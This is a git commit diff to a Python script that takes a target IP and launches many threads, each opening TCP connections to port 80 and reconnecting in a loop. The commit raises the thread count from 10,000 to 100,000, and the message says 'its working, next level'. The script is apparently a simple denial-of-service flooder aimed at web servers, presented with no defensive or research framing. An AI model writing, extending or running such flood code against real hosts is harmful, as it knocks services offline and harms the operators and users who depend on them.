138f1871d8084aed3991ea5fd2527d24bd4d5370
mynameisaist <ghtv1523@mail.ru>
2022-11-26 20:30:09 +0300

    its working, next level -> add args threading

--- main.py
+++ main.py
@@ -2,7 +2,9 @@ import socket
 import threading
 import optparse
 
-def is_ip_adress(ip : str) -> bool:
+number = 0
+
+def is_ip_adress(ip ):
     ip_list = ip.split(".")
     if len(ip_list) != 4:
         print("[-] Incorrect ip\n")
@@ -21,7 +23,7 @@ def is_ip_adress(ip : str) -> bool:
             exit()
     return True
 
-def get_arguments() -> str:
+def get_arguments():
     parser = optparse.OptionParser()
     parser.add_option("-i" , "--ip" , dest = "ip" , help = "Target ip adress")
     arguments , options = parser.parse_args()
@@ -29,7 +31,7 @@ def get_arguments() -> str:
         parser.error("[-] Please set IP adress of target , for more information use --help")
     return str(arguments.ip)
 
-def parse_args() -> str:
+def parse_args() :
     get_ip = get_arguments()
     if is_ip_adress(get_ip):
         return get_ip
@@ -37,7 +39,7 @@ def parse_args() -> str:
         print("[-] Inccorect ip adress")
         exit()
 
-def odnop(ip_adress : str) -> None:
+def odnop(ip_adress):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_adress = (ip_adress , 80)
     sock.connect(server_adress)
@@ -55,14 +57,13 @@ def odnop(ip_adress : str) -> None:
             sock.connect(server_adress)
 
 def main_work():
-    ip_adress = parse_args()
+    ip_arg = parse_args()
+    thread_arr = []
+    for i in range(100000):
+        thread_arr.append(threading.Thread(target = odnop , args = (ip_arg , )))
 
-    threading_arr = []
-    for i in range(10000):
-        threading_arr.append(threading.Thread(target = odnop , args = (ip_adress)))
-
-    for thread in threading_arr:
-        thread.start()
+    for curr_thread in thread_arr:
+        curr_thread.start()
 
 main_work()
     
